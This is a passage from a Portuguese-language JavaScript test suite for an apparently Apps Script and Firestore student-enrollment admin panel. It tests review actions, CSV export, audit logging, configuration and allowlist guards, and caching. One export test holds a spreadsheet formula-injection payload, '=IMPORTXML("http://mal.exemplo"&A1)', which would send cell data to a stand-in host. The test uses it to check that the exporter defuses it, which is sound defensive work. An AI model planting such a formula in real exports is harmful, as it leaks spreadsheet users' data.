  igual(r.ok, true);

  const aluno = amb.api.ler('alunos', 'a002');
  igual(aluno.status, 'CONFIRMADO');
  igual(aluno.observacoes, 'conferido na secretaria');
  igual(aluno.revisado_por, 'coordenacao@exemplo.com');
  verdadeiro(aluno.revisado_em.length > 0);
  igual(aluno.nome, 'João Souza', 'a updateMask precisa preservar o resto do documento');
});

teste('a decisão vai para a trilha de auditoria, com o de-para', () => {
  const amb = ambiente();
  semear(amb.api);
  chamar(amb, 'resolverAluno', { id: 'a002', status: 'CONFIRMADO' });

  const log = amb.api.ultimosRegistros(10);
  igual(log[0].acao, 'REVISAO');
  igual(log[0].entidade_id, 'a002');
  igual(log[0].detalhe, 'DIVERGENCIA -> CONFIRMADO');
});

teste('observação gigante é cortada no teto', () => {
  const amb = ambiente();
  semear(amb.api);
  chamar(amb, 'resolverAluno', {
    id: 'a002', status: 'CONFIRMADO', observacoes: 'x'.repeat(5000)
  });
  igual(amb.api.ler('alunos', 'a002').observacoes.length, 2000);
});

// ------------------------------------------------------------ Exportação

grupo('exportarCsv');

teste('cabeçalho, BOM e ponto e vírgula — o CSV que o Excel pt-BR abre', () => {
  const amb = ambiente();
  semear(amb.api);

  const r = chamar(amb, 'exportarCsv', {});
  igual(r.ok, true);
  igual(r.linhas, 4);
  igual(r.csv.charCodeAt(0), 0xFEFF, 'sem BOM o Excel embaralha os acentos');

  const primeira = r.csv.slice(1).split('\r\n')[0];
  igual(primeira.split(';')[0], '"Nome"');
  igual(primeira.split(';')[9], '"Status"');
});

teste('a coluna Status sai com o rótulo humano, não com a constante', () => {
  const amb = ambiente();
  semear(amb.api);
  const linhas = chamar(amb, 'exportarCsv', {}).csv.split('\r\n');
  verdadeiro(linhas.join('\n').indexOf('"Só matriculado"') !== -1, 'faltou o rótulo do status');
});

teste('=1+1 no nome não vira fórmula ao abrir a planilha', () => {
  const amb = ambiente();
  criarAluno(amb.api, 'a020', { nome: '=IMPORTXML("http://mal.exemplo"&A1)' });

  const csv = chamar(amb, 'exportarCsv', {}).csv;
  verdadeiro(csv.indexOf('"\'=IMPORTXML') !== -1, 'a aspa simples é o que impede a avaliação');
});

teste('aspas dentro do texto são escapadas, e a linha não quebra', () => {
  const amb = ambiente();
  criarAluno(amb.api, 'a021', { nome: 'Maria "Duda" Silva' });

  const csv = chamar(amb, 'exportarCsv', {}).csv;
  verdadeiro(csv.indexOf('"Maria ""Duda"" Silva"') !== -1, csv);
});

teste('a exportação respeita o filtro da tela', () => {
  const amb = ambiente();
  semear(amb.api);
  igual(chamar(amb, 'exportarCsv', { status: 'CONFIRMADO' }).linhas, 1);
  igual(chamar(amb, 'exportarCsv', { curso: 'ADM' }).linhas, 2);
  igual(chamar(amb, 'exportarCsv', { busca: 'pereira' }).linhas, 1);
});

teste('exportar entrega o MESMO conjunto que a tela mostrou', () => {
  // O botão Exportar fica ao lado do Filtrar e manda os mesmos três campos. Se a
  // tela achar por igualdade e a exportação varrer, o professor recebe um
  // arquivo vazio de um filtro que ele acabou de ver funcionar.
  const amb = ambiente();
  semear(amb.api);

  [{ busca: '529.982.247-25' }, { busca: '20250003' }, { busca: 'joao@exemplo.com' },
    { busca: 'silva' }, { curso: 'ADS', status: 'DIVERGENCIA' }].forEach((filtros) => {
    igual(chamar(amb, 'exportarCsv', filtros).linhas,
      chamar(amb, 'listarAlunos', filtros).total,
      'divergiu em ' + JSON.stringify(filtros));
  });
});

teste('exportar deixa rastro no log, com o tamanho do arquivo', () => {
  const amb = ambiente();
  semear(amb.api);
  chamar(amb, 'exportarCsv', {});

  const log = amb.api.ultimosRegistros(5);
  igual(log[0].acao, 'EXPORTACAO');
  igual(log[0].detalhe, '4 linhas');
});

teste('acima do teto o arquivo sai truncado e o log DIZ que saiu', () => {
  const amb = ambiente();
  for (let i = 1; i <= 6; i++) criarAluno(amb.api, 'c' + i, {});
  amb.api.PAINEL_BLOCO = 2;
  amb.api.PAINEL_TETO_EXPORTACAO = 4;

  igual(chamar(amb, 'exportarCsv', {}).linhas, 4);
  verdadeiro(amb.api.ultimosRegistros(5)[0].detalhe.indexOf('TRUNCADO') !== -1,
    'truncar em silêncio entregaria um cadastro incompleto como se fosse completo');
});

// ------------------------------------------------------------ Lotes e log

grupo('listarLotes e listarLog — ordenar por CAMPO, nunca por __name__ DESC');

teste('lotes ordena por criado_em DESC, com limite', () => {
  const amb = ambiente();
  amb.api.inserir('lotes', {
    arquivo: 'a.csv', criado_em: '20260701T090000000Z',
    importado_em: '2026-07-01 09:00:00', linhas: '10'
  }, 'l1');
  amb.api.inserir('lotes', {
    arquivo: 'b.csv', criado_em: '20260801T090000000Z',
    importado_em: '2026-08-01 09:00:00', linhas: '20'
  }, 'l2');
  amb.zerar();

  const r = chamar(amb, 'listarLotes');
  igual(r.itens.map((l) => l.arquivo), ['b.csv', 'a.csv']);

  const c = consultas(amb.falso)[0].corpo.structuredQuery;
  igual(c.orderBy[0].field.fieldPath, 'criado_em');
  igual(c.orderBy[0].direction, 'DESCENDING');
  igual(c.limit, 50);
});

teste('log ordena por criado_em DESC, com limite de 100', () => {
  const amb = ambiente();
  amb.api.registrar('TESTE', 'x', '1', 'primeiro');
  amb.zerar();

  const r = chamar(amb, 'listarLog');
  igual(r.itens[0].acao, 'TESTE');
  igual(r.itens[0].usuario, 'coordenacao@exemplo.com');

  const c = consultas(amb.falso)[0].corpo.structuredQuery;
  igual(c.orderBy[0].field.fieldPath, 'criado_em');
  igual(c.orderBy[0].direction, 'DESCENDING');
  igual(c.limit, 100);
});

teste('detalhe muito longo no log é resumido na tela', () => {
  const amb = ambiente();
  amb.api.registrar('TESTE', 'x', '1', 'y'.repeat(500));
  igual(chamar(amb, 'listarLog').itens[0].detalhe.length, 200);
});

teste('lotes com o carimbo sob outro nome não some da tela (rede de segurança)', () => {
  // O falso de apoio.js ORDENA documentos sem o campo pedido (usa '' como
  // chave); o Firestore de verdade os EXCLUI do resultado. Como é justamente
  // esse comportamento que a rede de segurança existe para cobrir, aqui `listar`
  // é trocado por um espião que reproduz a exclusão. ISTO PROVA A LÓGICA DA REDE,
  // NÃO O COMPORTAMENTO DO BANCO — só o Firestore real prova o segundo.
  const amb = ambiente();
  const pedidos = [];
  amb.api.listar = (colecao, opcoes) => {
    pedidos.push(opcoes);
    if (opcoes.ordenarPor) return { itens: [], cursor: null };
    return { itens: [{ _id: 'l9', arquivo: 'sem-carimbo.csv' }], cursor: null };
  };

  const r = chamar(amb, 'listarLotes');
  igual(r.itens.length, 1);
  igual(r.itens[0].arquivo, 'sem-carimbo.csv');
  igual(r.itens[0].lote_id, 'l9', 'sem campo lote_id, o id do documento serve');
  igual(pedidos.length, 2, 'a segunda consulta é a que distingue "vazio" de "não sei ordenar"');
});

teste('sem nenhum lote, a aba responde lista vazia e não erro', () => {
  const amb = ambiente();
  const r = chamar(amb, 'listarLotes');
  igual(r.ok, true);
  igual(r.itens, []);
});

// ------------------------------------------------------------ Configurações

grupo('lerConfiguracoes — segredo não sai daqui');

teste('lista as chaves de CONFIG_PADRAO com valor e descrição', () => {
  const amb = ambiente();
  amb.api.gravarConfig('vagas_padrao', '45');

  const r = chamar(amb, 'lerConfiguracoes');
  igual(r.ok, true);

  const mapa = {};
  r.itens.forEach((i) => { mapa[i.chave] = i; });

  igual(mapa.vagas_padrao.valor, '45');
  verdadeiro(mapa.cadastro_aberto !== undefined, 'faltou uma chave do padrão');
  verdadeiro(mapa.texto_lgpd.descricao.length > 0, 'a descrição vem do código, não do banco');
  igual(r.itens.length >= amb.api.CONFIG_PADRAO.length, true);
});

teste('chave marcada como segredo não chega à tela — nem o campo, nem o valor', () => {
  // O PIN era o único segredo, e ele saiu do sistema (07b_LinkPorEmail.gs).
  // CONFIG_SEGREDOS ficou VAZIO e o mecanismo continua de pé; este teste é o que
  // garante que ele ainda funciona no dia em que voltar a haver um — sem ele, o
  // primeiro segredo que alguém acrescentasse viajaria para o navegador no mesmo
  // deploy que o criasse, porque a tela imprime todo valor em `value="..."`.
  const amb = ambiente();
  amb.api.CONFIG_SEGREDOS.form_id = 'FORM_ID_SECRETO';
  amb.api.gravarConfig('form_id', 'segredo-de-verdade');

  const resposta = chamar(amb, 'lerConfiguracoes');
  igual(resposta.itens.filter((i) => i.chave === 'form_id'), []);
  igual(JSON.stringify(resposta).indexOf('segredo-de-verdade'), -1, 'o segredo vazou na resposta');
});

teste('e hoje não há nenhuma: a tela mostra CONFIG_PADRAO inteiro', () => {
  const amb = ambiente();
  const chaves = chamar(amb, 'lerConfiguracoes').itens.map((i) => i.chave);

  amb.api.CONFIG_PADRAO.forEach((padrao) => {
    verdadeiro(chaves.indexOf(padrao.chave) !== -1, padrao.chave + ' sumiu da aba Configurações');
  });
});

teste('chave criada à mão no banco não fica invisível', () => {
  const amb = ambiente();
  amb.api.atualizar('config', 'geral', { chave_estranha: 'valor' });
  amb.api.limparCacheConfig();

  const achada = chamar(amb, 'lerConfiguracoes').itens
    .filter((i) => i.chave === 'chave_estranha')[0];
  igual(achada.valor, 'valor');
});

teste('fora de uma implantação publicada, urlWebApp vem vazia', () => {
  const amb = ambiente();
  igual(chamar(amb, 'lerConfiguracoes').urlWebApp, '');
});

teste('publicado, urlWebApp devolve o endereço do web app', () => {
  const amb = ambiente();
  amb.api.ScriptApp.getService = () => ({ getUrl: () => 'https://script.google.com/macros/s/AAA/exec' });

  igual(chamar(amb, 'lerConfiguracoes').urlWebApp,
    'https://script.google.com/macros/s/AAA/exec');
});

grupo('salvarConfiguracao — as guardas contra trancar o painel por fora');

teste('grava e registra a chave, nunca o valor', () => {
  const amb = ambiente();
  const r = chamar(amb, 'salvarConfiguracao', { chave: 'texto_esgotado', valor: 'Acabou.' });
  igual(r.ok, true);

  amb.api.limparCacheConfig();
  igual(amb.api.config('texto_esgotado'), 'Acabou.');

  const log = amb.api.ultimosRegistros(5)[0];
  igual(log.acao, 'CONFIG');
  igual(log.entidade_id, 'texto_esgotado');
  igual(log.detalhe.indexOf('Acabou.'), -1, 'o valor não pode ir para a trilha');
});

teste('chave desconhecida é recusada — sem ela, o erro de digitação é mudo', () => {
  const amb = ambiente();
  const r = chamar(amb, 'salvarConfiguracao', { chave: 'vagas_padrao_', valor: '10' });
  igual(r.ok, false);
  verdadeiro(r.erro.indexOf('desconhecida') !== -1, r.erro);
});

teste('modo_acesso_painel não existe mais, e a tela recusa a chave morta', () => {
  // Ela ligava e desligava o PIN. Saiu com ele, e a guarda que a tela tinha para
  // ela saiu junto — o que a barra hoje é a lista de chaves conhecidas. O teste
  // fica porque uma chave que reaparecer no banco volta a ser editável pela tela,
  // e uma configuração que ninguém lê promete o que não cumpre.
  const amb = ambiente();
  const r = chamar(amb, 'salvarConfiguracao', { chave: 'modo_acesso_painel', valor: 'GOOGLE' });

  igual(r.ok, false);
  verdadeiro(r.erro.indexOf('desconhecida') !== -1, r.erro);
  igual(amb.api.CONFIG_PADRAO.filter((c) => c.chave === 'modo_acesso_painel'), []);
});

grupo('salvarConfiguracao — a allowlist não passa por aqui como texto');

teste('admin_emails vai para regravarAllowlist_: apagar a si mesmo é recusado', () => {
  // `admin_emails` é a lista de quem entra, e não um texto: gravá-la por aqui era
  // a porta dos fundos das guardas de `removerAdmin`.
  const amb = ambiente();
  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com');

  const r = chamar(amb, 'salvarConfiguracao', { chave: 'admin_emails', valor: '  ,  ' });

  igual(r.ok, false);
  verdadeiro(/único e-mail autorizado/.test(r.erro), r.erro);
  amb.api.limparCacheConfig();
  igual(amb.api.config('admin_emails'), 'coordenacao@exemplo.com');
});

teste('e esvaziar a lista de OUTRA pessoa também é recusado, sem depender de configuração', () => {
  // A segunda guarda, para quem não está na própria lista que está apagando.
  // Antes ela só valia com `modo_acesso_painel` = GOOGLE; essa chave deixou de
  // existir e a guarda passou a valer sempre — sem PIN, a allowlist é a fonte
  // única das DUAS portas remotas, então lista vazia é painel sem porta nenhuma.
  const amb = ambiente();
  amb.api.gravarConfig('admin_emails', 'outra@exemplo.com');

  const r = chamar(amb, 'salvarConfiguracao', { chave: 'admin_emails', valor: '' });

  igual(r.ok, false);
  verdadeiro(/Esvaziar a lista/.test(r.erro), r.erro);
  verdadeiro(/link por e-mail/.test(r.erro),
    'a recusa precisa dizer que as duas portas dependem da lista: ' + r.erro);
  amb.api.limparCacheConfig();
  igual(amb.api.config('admin_emails'), 'outra@exemplo.com');
});

teste('e-mail inválido no campo recusa o campo inteiro, sem gravar metade', () => {
  // Quem digitou `fulano@exemplo` e viu "salvo" acha que deu acesso a alguém.
  const amb = ambiente();
  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com');

  const r = chamar(amb, 'salvarConfiguracao', {
    chave: 'admin_emails', valor: 'coordenacao@exemplo.com, nova@exemplo.com, fulano@exemplo'
  });

  igual(r.ok, false);
  verdadeiro(r.erro.indexOf('fulano@exemplo') !== -1, r.erro);
  amb.api.limparCacheConfig();
  igual(amb.api.config('admin_emails'), 'coordenacao@exemplo.com', 'gravou parte do campo');
});

teste('a lista válida grava, e a auditoria diz quem entrou e quem saiu', () => {
  const amb = ambiente();
  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com, saindo@exemplo.com');

  const r = chamar(amb, 'salvarConfiguracao', {
    chave: 'admin_emails', valor: 'coordenacao@exemplo.com, Nova@Exemplo.com'
  });

  igual(r.ok, true, 'erro foi: ' + r.erro);
  igual(r.emails, ['coordenacao@exemplo.com', 'nova@exemplo.com']);

  const acoes = amb.api.ultimosRegistros(5).map((l) => l.acao).sort();
  igual(acoes, ['ADMIN_INCLUIDO', 'ADMIN_REMOVIDO']);
});

grupo('salvarConfiguracao — segredo não se edita pela tela');

teste('chave marcada como segredo é recusada com frase própria', () => {
  // CONFIG_SEGREDOS está vazio desde que o PIN saiu; a guarda fica de pé para o
  // dia em que não estiver. Sem ela, o primeiro segredo do sistema seria
  // editável — e legível — pela mesma tela que mostra o texto da LGPD.
  const amb = ambiente();
  amb.api.CONFIG_SEGREDOS.form_id = 'FORM_ID_SECRETO';

  const r = chamar(amb, 'salvarConfiguracao', { chave: 'form_id', valor: 'novo-valor' });

  igual(r.ok, false);
  verdadeiro(/secreta/.test(r.erro), r.erro);
  igual(amb.propriedades.has('FORM_ID_SECRETO'), false);
});

// -------------------------------------------------- Contratos com o painel

grupo('contratos que não podem divergir em silêncio');

// O painel saiu de `apps-script/Admin.html` para `docs/painel/index.html` em
// 07/08 (GitHub Pages). O nome da constante ficou: o que estes testes conferem é
// o contrato entre a TELA e o servidor, e ele não mudou de lado nenhum — só de
// arquivo. `apps-script/Admin.html` hoje é a página que redireciona para cá.
const ADMIN = fs.readFileSync(
  path.join(__dirname, '..', 'docs', 'painel', 'index.html'), 'utf8');
const FONTE = fs.readFileSync(path.join(PASTA_GS, '10_Painel.gs'), 'utf8');

/**
 * Todo nome de função que aparece no PRIMEIRO argumento de `chamar(`.
 *
 * Procurar por `chamar('nome'` casava só com a forma literal, e quebrou quando
 * `carregarAlunos` passou a escolher entre duas funções no mesmo lugar
 * (`chamar(cruzar ? 'atualizarAlunos' : 'listarAlunos', ...)`). O teste acusava
 * "o Admin.html não chama listarAlunos" com a chamada bem ali — falso positivo
 * que ensina a mexer no lugar errado.
 */
const CHAMADAS_DO_ADMIN = (() => {
  const nomes = {};
  const chamadas = /chamar\(\s*([^,]+),/g;
  let achado;
  while ((achado = chamadas.exec(ADMIN)) !== null) {
    (achado[1].match(/'([a-zA-Z_]+)'/g) || []).forEach((n) => { nomes[n.slice(1, -1)] = true; });
  }
  return nomes;
})();

teste('as funções desta fase existem e são chamadas pelo Admin.html', () => {
  const amb = ambiente();
  Object.keys(MINHAS_FUNCOES).forEach((funcao) => {
    igual(typeof amb.api[funcao], 'function', funcao + ' não existe');
    verdadeiro(CHAMADAS_DO_ADMIN[funcao],
      'o Admin.html não chama ' + funcao + ' — o contrato mudou de um lado só');
  });
});

teste('este arquivo não invade a fase de ninguém', () => {
  ['rodarReconciliacao', 'sincronizarForms', 'analisarArquivo',
    'confirmarImportacao', 'listarBanners', 'enviarBanner'].forEach((alheia) => {
    igual(FONTE.indexOf('function ' + alheia), -1,
      alheia + ' é de outro arquivo desta rodada');
  });
});

teste('a defesa do CSV tem nome próprio, e não invade o Repo', () => {
  const repo = fs.readFileSync(path.join(PASTA_GS, '02_Repo.gs'), 'utf8');
  igual(repo.indexOf('protegerContraFormula_'), -1,
    'se o Repo passar a ter a função, esta cópia local vira duplicata a remover');
  verdadeiro(FONTE.indexOf('function protegerFormulaCsv_') !== -1);
});

teste('os quatro status da tela são os quatro do sistema', () => {
  const amb = ambiente();
  ['CONFIRMADO', 'SO_INSCRITO', 'SO_MATRICULADO', 'DIVERGENCIA'].forEach((s) => {
    igual(amb.api.STATUS[s], s);
    verdadeiro(ADMIN.indexOf("opcaoStatus('" + s + "'") !== -1,
      'o modal de revisão não oferece ' + s);
    igual(chamar(amb, 'resolverAluno', { id: 'nao-existe', status: s }).erro,
      'Aluno não encontrado. Recarregue a lista.', s + ' foi tratado como status inválido');
  });
});

teste('a coleção de alunos é a mesma que a reconciliação vai escrever', () => {
  const amb = ambiente();
  igual(amb.api.ALUNOS_COLECAO, 'alunos');
  igual(amb.api.LOTES_COLECAO, 'lotes');
  igual(amb.api.MATRICULADOS_COLECAO, 'matriculados');
  igual(amb.api.INSCRICOES_COLECAO, 'inscricoes');
});

teste('LOTES_COLECAO tem o mesmo valor em 05_Importacao.gs e em 10_Painel.gs', () => {
  // Mesmo cuidado de INSCRICOES_COLECAO (testes/inscricoes.js): o Apps Script
  // não reclama de duas declarações, a última carregada vence em silêncio, e o
  // painel passaria a listar uma coleção vazia.
  const valores = ['05_Importacao.gs', '10_Painel.gs'].map((arquivo) => {
    const m = /var LOTES_COLECAO = '([^']*)'/.exec(fs.readFileSync(path.join(PASTA_GS, arquivo), 'utf8'));
    if (!m) throw new Error(arquivo + ' não declara LOTES_COLECAO');
    return m[1];
  });
  igual(valores[0], valores[1]);
});

teste('a importação de verdade grava lotes que este painel consegue ordenar', () => {
  // Contrato entre duas fases, exercitado com o código das DUAS: `registrarLote_`
  // é de 05_Importacao.gs e escolhe o campo do carimbo; `listarLotes` é daqui e
  // escolhe o campo da ordenação. Enquanto os dois não forem o mesmo, a aba Lotes
  // fica vazia sem erro nenhum — e é isso que este teste impede.
  const amb = criarAmbiente({
    arquivos: ['00_Config.gs', '01_Utils.gs', '02_Repo.gs', '03_Config.gs',
      '04_Inscricoes.gs', '04_Log.gs', '05_Importacao.gs', '07_Auth.gs',
      '07b_LinkPorEmail.gs',
      '09_Projetos.gs', '10_Painel.gs'],
    usuario: 'coordenacao@exemplo.com'
  });
  const token = amb.api.criarSessao_('coordenacao@exemplo.com');

  ['20260701T090000000Z_aaa', '20260801T090000000Z_bbb'].forEach((loteId, i) => {
    amb.api.registrarLote_({
      loteId: loteId,
      arquivo: ['antigo.csv', 'recente.csv'][i],
      tipo: 'CSV',
      gravados: 10,
      previstos: 10,
      quando: '2026-0' + (7 + i) + '-01 09:00:00',
      quem: 'coordenacao@exemplo.com',
      mapeamento: { nome: 0 },
      substituirPedido: false,
      falhou: false
    });
  });

  const r = amb.api.listarLotes({ token: token });
  igual(r.ok, true);
  igual(r.itens.map((l) => l.arquivo), ['recente.csv', 'antigo.csv'],
    'a aba Lotes precisa abrir com a importação mais recente no topo');
  igual(r.itens[0].linhas, '10');
  igual(r.itens[0].status, 'ATUALIZOU');
  igual(r.itens[0].importado_por, 'coordenacao@exemplo.com');
});

// ------------------------------------------------------------ Orçamento

grupo('orçamento de leitura — o número do cabeçalho, medido');

teste('abrir as três abas de leitura custa 11 + 3 + 3 requisições', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('projetos', { nome: 'R+ Cidades', vagas: '60', ativo: 'SIM', ordem: '1' }, 'p1');
  amb.zerar();

  chamar(amb, 'painelEstatisticas');   // 10 agregações + 1 leitura de agregados
  const antesProjetos = amb.falso.requisicoes.length;
  igual(antesProjetos, 11);

  // 1 leitura da configuração (vagas_padrao — `painelEstatisticas` não consulta
  // config nenhuma, então o cache da execução ainda está frio aqui), 1 consulta
  // da coleção de projetos e 1 agregação por projeto.
  chamar(amb, 'painelProjetos');
  igual(amb.falso.requisicoes.length - antesProjetos, 3);

  const antesAlunos = amb.falso.requisicoes.length;
  chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 });
  igual(amb.falso.requisicoes.length - antesAlunos, 3,
    '1 agregação do total, 1 consulta da página, 1 leitura dos cursos');
});

teste('paginar é linear na página pedida — é o preço de paginar por número', () => {
  const amb = ambiente();
  semearMuitos(amb.api, 25);
  amb.zerar();

  chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 });
  igual(consultas(amb.falso).length, 1);

  amb.zerar();
  chamar(amb, 'listarAlunos', { pagina: 3, tamanho: 10 });
  igual(consultas(amb.falso).length, 3, 'a página 3 relê a 1 e a 2 para chegar ao cursor');
});

teste('a busca por matrícula custa 3 requisições, não 2.500 leituras', () => {
  const amb = ambiente();
  for (let i = 1; i <= 30; i++) {
    criarAluno(amb.api, 'd' + String(i).padStart(3, '0'), { matricula: '9000' + i });
  }
  amb.zerar();

  chamar(amb, 'listarAlunos', { busca: '900017' });
  igual(amb.falso.requisicoes.length, 2, '1 consulta por igualdade + 1 leitura dos cursos');
});

teste('salvar configuração não lê nada além do documento de config', () => {
  const amb = ambiente();
  amb.api.lerConfig();
  amb.zerar();

  chamar(amb, 'salvarConfiguracao', { chave: 'vagas_padrao', valor: '30' });
  igual(leiturasDePonto(amb.falso).length, 0, 'a configuração já estava em cache da execução');
  igual(escritas(amb.falso).length, 2, '1 PATCH da config + 1 registro de log');
});

// ------------------------------------------ A busca exata obedece aos filtros

grupo('a busca exata não fura o filtro da barra');

// A busca por igualdade filtra no banco por matrícula, CPF ou e-mail — e por
// mais nada. O filtro de curso ia junto no `pedido.filtro` e era DESCARTADO neste
// caminho, porque a peneira só conferia o status, e só quando os dois filtros
// estavam preenchidos. Resultado: colar a matrícula de um aluno de ADS com o
// filtro em ADM devolvia o aluno de ADS dentro da lista de ADM, e o Exportar ao
// lado exportava a mesma linha. Não corrompia dado nenhum; mentia na tela.

teste('matrícula de outro curso não aparece na lista do curso filtrado', () => {
  const amb = ambiente();
  semear(amb.api);

  // 'a001' é Maria, do curso ADS.
  const r = chamar(amb, 'listarAlunos', { curso: 'ADM', busca: '20250001' });

  igual(r.ok, true, r.erro);
  igual(r.itens.map((a) => a.nome), [], 'Maria é de ADS e o filtro pedia ADM');
  igual(r.total, 0);
});

teste('matrícula do curso certo continua sendo encontrada, e barata', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { curso: 'ADS', busca: '20250001' });

  igual(r.itens.map((a) => a.nome), ['Maria da Silva']);
  igual(amb.falso.requisicoes.length, 2,
    'o conserto não pode custar varredura: 1 consulta por igualdade + 1 leitura dos cursos');
});

teste('a busca exata também obedece ao filtro de status sozinho', () => {
  const amb = ambiente();
  semear(amb.api);

  // Maria é CONFIRMADO; a barra pede DIVERGENCIA.
  igual(chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA', busca: '20250001' }).itens, []);
  igual(chamar(amb, 'listarAlunos', { status: 'CONFIRMADO', busca: '20250001' })
    .itens.map((a) => a.nome), ['Maria da Silva']);
});

teste('busca por CPF com pontuação continua casando — a peneira de texto não voltou', () => {
  // A separação entre `peneira` e `aceita` existe por isto: '529.982.247-25'
  // normalizado como texto nunca casaria com o CPF gravado só com dígitos.
  const amb = ambiente();
  semear(amb.api);

  igual(chamar(amb, 'listarAlunos', { busca: '529.982.247-25' }).itens.map((a) => a.nome),
    ['Maria da Silva']);
  igual(chamar(amb, 'listarAlunos', { curso: 'ADS', busca: '529.982.247-25' })
    .itens.map((a) => a.nome), ['Maria da Silva']);
});

teste('exportar com o mesmo filtro concorda com a lista — as duas pela mesma peneira', () => {
  // `colherAlunos_` existe para lista e exportação nunca divergirem. Antes elas
  // não divergiam: erravam junto.
  const amb = ambiente();
  semear(amb.api);

  const lista = chamar(amb, 'listarAlunos', { curso: 'ADM', busca: '20250001' });
  const csv = chamar(amb, 'exportarCsv', { curso: 'ADM', busca: '20250001' });

  igual(lista.itens.length, 0);
  igual(csv.linhas, 0, 'o Exportar ao lado da lista não pode entregar o que a lista não mostra');
  verdadeiro(csv.csv.indexOf('Maria') === -1, 'o CSV veio com a aluna de outro curso');
});

// ------------------------------------------------------- O painel era lento

/**
 * O sintoma, nas palavras de quem usa: "ele fica um tempinho sempre carregando".
 *
 * A causa não era cota — 11 leituras num teto de 50 mil não pesam. Era o
 * RELÓGIO: as 11 requisições de `painelEstatisticas` saem em fila, cada ida e
 * volta ao Firestore custa perto de 300 ms, e isso se soma ao custo fixo de uma
 * execução do Apps Script. O que estes testes guardam é que os três remédios
 * continuam de pé, e que nenhum deles mente.
 */
grupo('o painel era lento — cache, e o que ele não pode esconder');

/** Ambiente com relógio controlado, para exercitar a janela do cache. */
function ambienteComRelogio(inicioMs) {
  const relogio = criarRelogio(inicioMs);
  const amb = ambiente({ relogio: relogio });
  amb.relogio = relogio;
  return amb;
}

teste('a segunda abertura do Painel não custa requisição nenhuma', () => {
  const amb = ambiente();
  semear(amb.api);

  const primeira = chamar(amb, 'painelEstatisticas');
  amb.zerar();
  const segunda = chamar(amb, 'painelEstatisticas');

  igual(amb.falso.requisicoes.length, 0, 'as 10 agregações voltaram a sair na segunda abertura');
  igual(segunda.dados, primeira.dados, 'o cache respondeu outra coisa');
});

teste('atualizar: true fura o cache — é o botão Atualizar e o "acabei de gravar"', () => {
  const amb = ambiente();
  semear(amb.api);

  chamar(amb, 'painelEstatisticas');
  amb.zerar();

  chamar(amb, 'painelEstatisticas', { atualizar: true });
  igual(amb.falso.requisicoes.length, 11, 'o pedido explícito de atualização respondeu do cache');
});

teste('atualizar: true REESCREVE o cache — o professor seguinte também vê o novo', () => {
  // Furar sem reescrever faria a atualização valer só para quem clicou: o
  // próximo a abrir o painel receberia de novo o número velho, ainda dentro da
  // janela, e a impressão seria de sistema que "às vezes atualiza".
  const amb = ambiente();
  semear(amb.api);

  chamar(amb, 'painelEstatisticas');
  criarAluno(amb.api, 'a099', { status: 'CONFIRMADO' });

  igual(chamar(amb, 'painelEstatisticas', { atualizar: true }).dados.total, 5);
  amb.zerar();
  igual(chamar(amb, 'painelEstatisticas').dados.total, 5, 'a entrada nova não foi guardada');
  igual(amb.falso.requisicoes.length, 0);
});

teste('a janela é de 30 segundos, e ela REABRE', () => {
  // Cache que nunca expira provaria metade: mostraria a segunda chamada engolida
  // e esconderia que o número volta a ser buscado.
  const amb = ambienteComRelogio(Date.UTC(2026, 7, 6, 12, 0, 0));
  semear(amb.api);
  igual(amb.api.PAINEL_CACHE_S, 30);

  chamar(amb, 'painelEstatisticas');

  amb.relogio.avancar(29 * 1000);
  amb.zerar();
  chamar(amb, 'painelEstatisticas');
  igual(amb.falso.requisicoes.length, 0, 'antes dos 30 s ainda é o mesmo gesto');

  amb.relogio.avancar(2 * 1000);
  amb.zerar();
  chamar(amb, 'painelEstatisticas');
  igual(amb.falso.requisicoes.length, 11, 'passados os 30 s o painel precisa voltar ao banco');
});

teste('resolver uma divergência derruba o cache na hora', () => {
  // É o modo de o cache mentir para quem escreveu: a professora resolve a
  // divergência, volta para o Painel e continua vendo a divergência contada.
  const amb = ambiente();
  semear(amb.api);

  igual(chamar(amb, 'painelEstatisticas').dados.porStatus.DIVERGENCIA, 1);

  const divergente = chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA' }).itens[0];
  igual(chamar(amb, 'resolverAluno', { id: divergente.id, status: 'CONFIRMADO' }).ok, true);

  igual(chamar(amb, 'painelEstatisticas').dados.porStatus.DIVERGENCIA, 0,
    'o painel mostrou a divergência que a coordenação acabou de resolver');
});

teste('resposta de erro não entra no cache', () => {
  // Guardar um `{ ok: false }` faria uma indisponibilidade de um segundo virar
  // erro repetido por 30 s — e o botão Atualizar mostraria a mesma falha.
  const amb = ambiente();
  const originais = { contar: amb.api.contar };
  amb.api.contar = () => { throw new Error('Firestore 503 UNAVAILABLE'); };

  igual(chamar(amb, 'painelEstatisticas').ok, false);

  amb.api.contar = originais.contar;
  amb.zerar();
  const depois = chamar(amb, 'painelEstatisticas');
  igual(depois.ok, true, 'a falha ficou guardada e o painel não se recuperou sozinho');
  igual(amb.falso.requisicoes.length, 11);
});

teste('sem token, o cache quente não entrega número nenhum', () => {
  // A conferência do token vem ANTES de qualquer contato com o cache: os dez
  // números descrevem o cadastro inteiro, e responder do cache sem token seria
  // entregá-los mais barato do que o banco entregaria.
  const amb = ambiente();
  semear(amb.api);
  chamar(amb, 'painelEstatisticas');
  amb.zerar();

  const r = amb.api.painelEstatisticas({});
  igual(r.ok, false);
  igual(r.dados, undefined, 'o cache respondeu a quem não tem sessão');
  igual(amb.falso.requisicoes.length, 0);
});

teste('CacheService ausente devolve o painel ao caminho sem cache', () => {
  // Cache é otimização, nunca dependência: no Apps Script ele pode estar fora do
  // ar, e nos testes de outra fase ele pode nem existir no ambiente.
  const amb = ambiente();
  semear(amb.api);
  amb.api.CacheService = undefined;

  igual(chamar(amb, 'painelEstatisticas').dados.total, 4);
  amb.zerar();
  igual(chamar(amb, 'painelEstatisticas').dados.total, 4);
  igual(amb.falso.requisicoes.length, 11, 'sem cache o custo é o de antes — e a resposta, correta');
});

// ------------------------------------------------ A lista de cursos sob demanda

grupo('listarAlunos só manda os cursos quando a tela ainda não os tem');

teste('cursos: false economiza a leitura de ponto', () => {
  const amb = ambiente();
  semear(amb.api);
